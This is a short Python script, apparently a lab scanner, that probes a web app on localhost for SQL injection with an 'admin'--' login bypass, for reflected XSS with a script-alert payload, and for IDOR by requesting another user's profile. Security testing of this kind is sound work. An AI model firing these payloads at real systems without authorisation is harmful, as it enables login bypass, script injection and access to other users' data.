import requests

TARGET = "http://localhost:5000"

print("\n=== Vulnerability Scanner ===")

# SQLi
print("\nTesting SQL Injection")

data = {
"username":"admin'--",
"password":"test"
}

r = requests.post(f"{TARGET}/login",data=data)

if "profile" in r.text:
    print("SQLi vulnerability detected")
else:
    print("SQLi not detected")


# XSS
print("\nTesting XSS")

payload="<script>alert(1)</script>"

r=requests.get(f"{TARGET}/search?q={payload}")

if payload in r.text:
    print("XSS vulnerability detected")
else:
    print("XSS not detected")


# IDOR
print("\nTesting IDOR")

r=requests.get(f"{TARGET}/user/2/profile")

if r.status_code==200:
    print("IDOR vulnerability detected")
else:
    print("IDOR blocked")